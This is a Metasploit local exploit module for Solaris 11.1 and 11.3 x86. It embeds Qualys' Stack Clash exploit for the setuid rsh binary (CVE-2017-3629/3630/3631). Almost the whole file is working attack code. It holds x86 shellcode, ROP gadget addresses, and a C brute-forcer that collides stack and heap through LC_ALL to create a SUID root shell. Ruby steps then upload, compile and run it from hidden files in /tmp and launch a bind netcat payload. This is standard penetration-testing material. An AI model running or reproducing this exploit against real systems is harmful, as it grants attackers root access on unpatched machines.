##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = GoodRanking

  include Msf::Post::File
  include Msf::Post::Solaris::Priv
  include Msf::Post::Solaris::System
  include Msf::Post::Solaris::Kernel
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Solaris RSH Stack Clash Privilege Escalation',
      'Description'    => %q{
        This module exploits a vulnerability in RSH on unpatched Solaris
        systems which allows users to gain root privileges.

        The stack guard page on unpatched Solaris systems is of
        insufficient size to prevent collisions between the stack
        and heap memory, aka Stack Clash.

        This module uploads and executes Qualys' Solaris_rsh.c exploit,
        which exploits a vulnerability in RSH to bypass the stack guard
        page to write to the stack and create a SUID root shell.

        This module has offsets for Solaris versions 11.1 (x86) and
        Solaris 11.3 (x86).

        Exploitation will usually complete within a few minutes using
        the default number of worker threads (10). Occasionally,
        exploitation will fail. If the target system is vulnerable,
        usually re-running the exploit will be successful.

        This module has been tested successfully on Solaris 11.1 (x86)
        and Solaris 11.3 (x86).
      },
      'References'     =>
        [
          ['BID', '99151'],
          ['BID', '99153'],
          ['CVE', '2017-1000364'],
          ['CVE', '2017-3629'],
          ['CVE', '2017-3630'],
          ['CVE', '2017-3631'],
          ['EDB', '42270'],
          ['URL', 'http://www.oracle.com/technetwork/security-advisory/alert-cve-2017-3629-3757403.html'],
          ['URL', 'https://blog.qualys.com/securitylabs/2017/06/19/the-stack-clash'],
          ['URL', 'https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt']
        ],
      'Notes'          => { 'AKA' => ['Stack Clash', 'Solaris_rsh.c'] },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Qualys Corporation', # Stack Clash technique and Solaris_rsh.c exploit
          'Brendan Coles'       # Metasploit
        ],
      'DisclosureDate' => 'Jun 19 2017',
      'Privileged'     => true,
      'Platform'       => ['unix'],
      'Arch'           => [ARCH_X86, ARCH_X64],
      'SessionTypes'   => ['shell', 'meterpreter'],
      'Targets'        =>
        [
          ['Automatic', {}],
          ['Solaris 11.1', {}],
          ['Solaris 11.3', {}]
        ],
      'DefaultOptions' =>
        {
          'PAYLOAD'     => 'cmd/unix/bind_netcat',
          'WfsDelay'    => 10,
          'PrependFork' => true
        },
      'DefaultTarget'  => 0))
    register_options [
      OptInt.new('WORKERS', [true, 'Number of workers', '10']),
      OptString.new('RSH_PATH', [true, 'Path to rsh executable', '/usr/bin/rsh'])
    ]
    register_advanced_options [
      OptBool.new('ForceExploit',  [false, 'Override check result', false]),
      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])
    ]
  end

  def rsh_path
    datastore['RSH_PATH']
  end

  def mkdir(path)
    vprint_status "Creating '#{path}' directory"
    cmd_exec "mkdir -p #{path}"
    register_dir_for_cleanup path
  end

  def upload(path, data)
    print_status "Writing '#{path}' (#{data.size} bytes) ..."
    rm_f path
    write_file path, data
    register_file_for_cleanup path
  end

  def upload_and_compile(path, data)
    upload "#{path}.c", data

    output = cmd_exec "PATH=$PATH:/usr/sfw/bin/:/opt/sfw/bin/:/opt/csw/bin gcc -Wall -std=gnu99 -o #{path} #{path}.c"
    unless output.blank?
      print_error output
      fail_with Failure::Unknown, "#{path}.c failed to compile"
    end

    register_file_for_cleanup path
  end

  def symlink(link_target, link_name)
    print_status "Symlinking #{link_target} to #{link_name}"
    rm_f link_name
    cmd_exec "ln -sf #{link_target} #{link_name}"
    register_file_for_cleanup link_name
  end

  def check
    unless setuid? rsh_path
      vprint_error "#{rsh_path} is not setuid"
      return CheckCode::Safe
    end
    vprint_good "#{rsh_path} is setuid"

    unless has_gcc?
      vprint_error 'gcc is not installed'
      return CheckCode::Safe
    end
    vprint_good 'gcc is installed'

    version = kernel_version
    if version.to_s.eql? ''
      vprint_error 'Could not determine Solaris version'
      return CheckCode::Detected
    end

    unless ['11.1', '11.3'].include? version
      vprint_error "Solaris version #{version} is not vulnerable"
      return CheckCode::Safe
    end
    vprint_good "Solaris version #{version} appears to be vulnerable"

    CheckCode::Detected
  end

  def exploit
    if is_root?
      fail_with Failure::BadConfig, 'Session already has root privileges'
    end

    unless check == CheckCode::Detected
      unless datastore['ForceExploit']
        fail_with Failure::NotVulnerable, 'Target is not vulnerable. Set ForceExploit to override.'
      end
      print_warning 'Target does not appear to be vulnerable'
    end

    unless writable? datastore['WritableDir']
      fail_with Failure::BadConfig, "#{datastore['WritableDir']} is not writable"
    end

    if target.name.eql? 'Automatic'
      case kernel_version
      when '11.1'
        my_target = targets[1]
        arg = 0
      when '11.3'
        my_target = targets[2]
        arg = 1
      else
        fail_with Failure::NoTarget, 'Unable to automatically select a target'
      end
    else
      my_target = target
    end
    print_status "Using target: #{my_target.name}"

    base_path = "#{datastore['WritableDir']}/.#{rand_text_alphanumeric 5..10}"
    mkdir base_path

    # Solaris_rsh.c by Qualys
    # modified for Metasploit
    workers = datastore['WORKERS'].to_i
    root_shell = 'ROOT'
    shellcode = '\x31\xc0\x50\x68'
    shellcode << root_shell
    shellcode << '\x89\xe3\x50\x53\x89\xe2\x50\x50'
    shellcode << '\x52\x53\xb0\x3C\x48\x50\xcd\x91'
    shellcode << '\x31\xc0\x40\x50\x50\xcd\x91Z'
    exp = <<-EOF
/*
 * Solaris_rsh.c for CVE-2017-3630, CVE-2017-3629, CVE-2017-3631
 * Copyright (C) 2017 Qualys, Inc.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/fcntl.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#ifndef timersub
#define timersub(a, b, result) \\
    do { \\
        (result)->tv_sec = (a)->tv_sec - (b)->tv_sec; \\
        (result)->tv_usec = (a)->tv_usec - (b)->tv_usec; \\
        if ((result)->tv_usec < 0) { \\
            --(result)->tv_sec; \\
            (result)->tv_usec += 1000000; \\
        } \\
    } while (0)
#endif

#define RSH "#{rsh_path}"
static const struct target * target;
static const struct target {
    const char * name;
    size_t s_first, s_last, s_step;
    size_t l_first, l_last, l_step;
    size_t p_first, p_last, p_step;
    size_t a, b;
    size_t i, j;
}
targets[] = {
    {
        .name = "Oracle Solaris 11.1 X86 (Assembled 19 September 2012)",
        .s_first = 16*1024, .s_last = 44*1024, .s_step = 4096,
        .l_first = 192,     .l_last = 512,     .l_step = 16,
        .p_first = 0,       .p_last = 8192,    .p_step = 1,
        .a = 0,             .b = 15,           .j = 12,
        .i = 0x08052608 /* pop edx; pop ebp; ret */
    },
    {
        .name = "Oracle Solaris 11.3 X86 (Assembled 06 October 2015)",
        .s_first = 12*1024, .s_last = 44*1024, .s_step = 4096,
        .l_first = 96,      .l_last = 512,     .l_step = 4,
        .p_first = 0,       .p_last = 4096,    .p_step = 4,
        .a = 0,             .b = 3,            .j = SIZE_MAX,
        .i = 0x07faa7ea /* call *0xc(%ebp) */
    },
};

#define ROOTSHELL "#{root_shell}"
static const char shellcode[] = "#{shellcode}";

static volatile sig_atomic_t sigalarm;

static void
sigalarm_handler(const int signum __attribute__((__unused__)))
{
    sigalarm = 1;
}

#define die() do { \\
    fprintf(stderr, "died in %s: %u\\n", __func__, __LINE__); \\
    exit(EXIT_FAILURE); \\
} while (0)

static int
is_suid_root(const char * const file)
{
    if (!file) die();
    static struct stat sbuf;
    if (stat(file, &sbuf)) die();
    if (!S_ISREG(sbuf.st_mode)) die();
    return ((sbuf.st_uid == 0) && (sbuf.st_mode & S_ISUID));
}

static const char *
build_lca(const size_t l)
{
    static const size_t shellcode_len = sizeof(shellcode)-1;
    if (shellcode_len > 64) die();
    if (shellcode_len % 16) die();
    if (l < shellcode_len + target->a + target->b) die();

    #define LCA_MAX 4096
    if (l > LCA_MAX) die();
    static char lca[128 + LCA_MAX];
    strcpy(lca, "LC_ALL=");
    char * cp = memchr(lca, '\\0', sizeof(lca));
    if (!cp) die();
    memcpy(cp, shellcode, shellcode_len);
    cp += shellcode_len;
    memset(cp, 'a', target->a);

    size_t o;
    for (o = target->a; l - o >= 4; o += 4) {
        if ((o - target->a) % 16 == target->j) {
            cp[o + 0] = '\\xeb';
            cp[o + 1] = (o - target->a >= 16) ? -(16u + 2u) :
                -(shellcode_len + target->a + target->j + 2);
            cp[o + 2] = 'j';
            cp[o + 3] = 'j';
        } else {
            if (sizeof(size_t) != 4) die();
            *(size_t *)(cp + o) = target->i;
        }
    }
    cp += o;
    memset(cp, 'b', target->b);
    cp[target->b] = '\\0';
    if (strlen(lca) != 7 + shellcode_len + o + target->b) die();
    return lca;
}

static const char *
build_pad(const size_t p)
{
    #define PAD_MAX 8192
    if (p > PAD_MAX) die();
    static char pad[64 + PAD_MAX];
    strcpy(pad, "P=");
    char * const cp = memchr(pad, '\\0', sizeof(pad));
    if (!cp) die();
    memset(cp, 'p', p);
    cp[p] = '\\0';
    if (strlen(pad) != 2 + p) die();
    return pad;
}

static void
fork_worker(const size_t s, const char * const lca, const char * const pad)
{
    #define N_WORKERS #{workers.to_i}
    static size_t n_workers;
    static struct {
        pid_t pid;
        struct timeval start;
    } workers[N_WORKERS];

    size_t i_worker;
    struct timeval start, stop, diff;

    if (n_workers >= N_WORKERS) {
        if (n_workers != N_WORKERS) die();
        int is_suid_rootshell = 0;
        for (;;) {
            sigalarm = 0;
            #define TIMEOUT 10
            alarm(TIMEOUT);
            int status = 0;
            const pid_t pid = waitpid(-1, &status, WUNTRACED);
            alarm(0);
            if (gettimeofday(&stop, NULL)) die();

            if (pid <= 0) {
                if (pid != -1) die();
                if (errno != EINTR) die();
                if (sigalarm != 1) die();
            }
            int found_pid = 0;
            for (i_worker = 0; i_worker < N_WORKERS; i_worker++) {
                const pid_t worker_pid = workers[i_worker].pid;
                if (worker_pid <= 0) die();
                if (worker_pid == pid) {
                    if (found_pid) die();
                    found_pid = 1;
                    if (WIFEXITED(status) || WIFSIGNALED(status))
                        workers[i_worker].pid = 0;
                } else {
                    timersub(&stop, &workers[i_worker].start, &diff);
                    if (diff.tv_sec >= TIMEOUT)
                        if (kill(worker_pid, SIGKILL)) die();
                }
            }
            if (!found_pid) {
                if (pid != -1) die();
                continue;
            }
            if (WIFEXITED(status)) {
                if (WEXITSTATUS(status) != EXIT_FAILURE)
                    fprintf(stderr, "exited %d\\n", WEXITSTATUS(status));
                break;
            } else if (WIFSIGNALED(status)) {
                if (WTERMSIG(status) != SIGSEGV)
                    fprintf(stderr, "signal %d\\n", WTERMSIG(status));
                break;
            } else if (WIFSTOPPED(status)) {
                fprintf(stderr, "stopped %d\\n", WSTOPSIG(status));
                is_suid_rootshell |= is_suid_root(ROOTSHELL);
                if (kill(pid, SIGKILL)) die();
                continue;
            }
            fprintf(stderr, "unknown %d\\n", status);
            die();
        }
        if (is_suid_rootshell) {
            system("ls -lL " ROOTSHELL);
            exit(EXIT_SUCCESS);
        }
        n_workers--;
    }
    if (n_workers >= N_WORKERS) die();

    static char rsh_link[64];
    if (*rsh_link != '/') {
        const int rsh_fd = open(RSH, O_RDONLY);
        if (rsh_fd <= STDERR_FILENO) die();
        if ((unsigned int)snprintf(rsh_link, sizeof(rsh_link),
            "/proc/%ld/fd/%d", (long)getpid(), rsh_fd) >= sizeof(rsh_link)) die();
        if (access(rsh_link, R_OK | X_OK)) die();
        if (*rsh_link != '/') die();
    }

    static int null_fd = -1;
    if (null_fd <= -1) {
        null_fd = open("/dev/null", O_RDWR);
        if (null_fd <= -1) die();
    }

    const pid_t pid = fork();
    if (pid <= -1) die();
    if (pid == 0) {
        const struct rlimit stack = { s, s };
        if (setrlimit(RLIMIT_STACK, &stack)) die();

        if (dup2(null_fd, STDIN_FILENO) != STDIN_FILENO) die();
        if (dup2(null_fd, STDOUT_FILENO) != STDOUT_FILENO) die();
        if (dup2(null_fd, STDERR_FILENO) != STDERR_FILENO) die();

        static char * const argv[] = { rsh_link, "-?", NULL };
        char * const envp[] = { (char *)lca, (char *)pad, NULL };
        execve(*argv, argv, envp);
        die();
    }
    if (gettimeofday(&start, NULL)) die();
    for (i_worker = 0; i_worker < N_WORKERS; i_worker++) {
        const pid_t worker_pid = workers[i_worker].pid;
        if (worker_pid > 0) continue;
        if (worker_pid != 0) die();
        workers[i_worker].pid = pid;
        workers[i_worker].start = start;
        n_workers++;
        return;
    }
    die();
}

int main(const int argc, const char * const argv[])
{
    static const struct rlimit core;
    if (setrlimit(RLIMIT_CORE, &core)) die();

    if (geteuid() == 0) {
        if (is_suid_root(ROOTSHELL)) {
            if (setuid(0)) die();
            if (setgid(0)) die();
            static char * const argv[] = { "/bin/sh", NULL };
            execve(*argv, argv, NULL);
            die();
        }
        chown(*argv, 0, 0);
        chmod(*argv, 04555);
        for (;;) {
            raise(SIGSTOP);
            sleep(1);
        }
        die();
    }

    const size_t i = strtoul(argv[1], NULL, 10);
    if (i >= sizeof(targets)/sizeof(*targets)) die();
    target = targets + i;
    fprintf(stderr, "Target %zu %s\\n", i, target->name);

    if (target->a >= 16) die();
    if (target->b >= 16) die();
    if (target->i <= 0) die();
    if (target->j >= 16 || target->j % 4) {
        if (target->j != SIZE_MAX) die();
    }

    static const struct sigaction sigalarm_action = { .sa_handler = sigalarm_handler };
    if (sigaction(SIGALRM, &sigalarm_action, NULL)) die();

    size_t s;
    for (s = target->s_first; s <= target->s_last; s += target->s_step) {
        if (s % target->s_step) die();

        size_t l;
        for (l = target->l_first; l <= target->l_last; l += target->l_step) {
            if (l % target->l_step) die();
            const char * const lca = build_lca(l);
            fprintf(stdout, "s %zu l %zu\\n", s, l);

            size_t p;
            for (p = target->p_first; p <= target->p_last; p += target->p_step) {
                if (p % target->p_step) die();
                const char * const pad = build_pad(p);
                fork_worker(s, lca, pad);
            }
        }
    }
    fprintf(stdout, "Failed\\n");
}
    EOF

    exploit_name = ".#{rand_text_alphanumeric 5..15}"
    upload_and_compile "#{base_path}/#{exploit_name}", exp
    symlink "#{base_path}/#{exploit_name}", "#{base_path}/#{root_shell}"

    print_status "Creating suid root shell. This may take a while..."
    cmd_exec "cd #{base_path}"
    start = Time.now
    output = cmd_exec "./#{exploit_name} #{arg}", nil, 1_800
    stop = Time.now
    print_status "Completed in #{(stop - start).round(2)}s"
    unless output.include? 'root'
      fail_with Failure::Unknown, "Failed to create suid root shell: #{output}"
    end
    print_good "suid root shell created: #{base_path}/#{root_shell}"

    payload_name = ".#{rand_text_alphanumeric 5..10}"
    payload_path = "#{base_path}/#{payload_name}"
    upload payload_path, payload.encoded
    cmd_exec "chmod +x '#{payload_path}'"

    print_status 'Executing payload...'
    cmd_exec "echo #{payload_path} | ./#{root_shell} & echo "
  end
end